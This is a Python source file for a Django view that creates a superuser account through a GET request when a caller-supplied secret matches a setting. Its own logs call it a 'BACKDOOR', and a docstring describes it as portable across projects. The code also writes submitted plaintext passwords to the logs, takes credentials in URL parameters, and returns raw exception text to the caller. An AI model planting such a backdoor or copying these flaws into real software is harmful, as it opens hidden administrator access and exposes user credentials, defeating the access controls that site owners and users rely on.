from django.contrib import messages
from django.forms.models import model_to_dict
from django.http import JsonResponse
from django.views import View
from django.contrib.auth import get_user_model
from django.core.cache import cache
from django.conf import settings
from django.db import transaction

import logging, hmac
logger = logging.getLogger(__name__)





class CreateSYAcc(View):    
    def get(self, request, email = None, password = None, sy_secret_incoming = None):
        key= f'admin-create:{email}'.upper()
        limit=cache.get(key)    #   Increase exponentially 1,2,4,8,etc
        superuser_logger(msg=f"Current rate limited status of email '{email}' is {limit}")
        if limit:
            if limit >=60: new_lim = 60
            else:new_lim= limit*2
            cache.set(key, new_lim, timeout=new_lim)
            return JsonResponse({'message': f'try again in the next {new_lim} seconds, try before time end increase ban time'}, status=400)
        cache.set(key, 1, timeout=1)        #Made this indpendedt so below code after theif not can use it
        _ = getattr(settings, "SY_SECRET", None)
        if not _: return JsonResponse({'message': 'Tampered Project'})
        data = {
            'email': email,
            'password':password,
        }
        superuser_logger(msg=f"ATTEMPT BACKDOOR BREACH: {request.META['REMOTE_ADDR']} and x-forwared is ({request.META.get('HTTP_X_FORWARDED_FOR', None)}) attempted a breach on the system with data as ({data})")
        if not hmac.compare_digest(sy_secret_incoming, _):
            superuser_logger("BREACH OUTCOME: breach failed as sy secret not match")
            return JsonResponse({'message': 'ERROR; missing params, your action have been Noted, avoid spam as you will be restricted'})
        try:
            superuser_logger("BREACH OUTCOME: breach successful!")
            with transaction.atomic():
                istance = get_user_model().objects.create_superuser(**data)
                istance.full_clean()
                istance.save()
                superuser_logger("Account Creation success, attacker inside the project")
                return JsonResponse(model_to_dict(istance, exclude=['password', 'id']))
        except Exception as e:
            superuser_logger("Account Creation failed")
            return JsonResponse({'detail': str(e)})
            
    
    
def superuser_logger(msg, debug = getattr(settings, 'DEBUG', False)):
    """LOGGER BUT FOR BACKDOOR ONLY SO ITS MOBILE AND EASILY MOVABLE ACROSS PROJECTS"""
    logger.error(msg=msg)
    if debug:print(msg)
    else:logger.info(msg=msg)
    send_alert()
    
    
def send_alert():
    #Only for this SUPERUSER USAGE TO NOTIFY OF POTENTIAL BREACH
    """TODO: Configure email to be sent to only user with the superuser true stating a potential breach and called each time the superuser_loger is beign called"""
    pass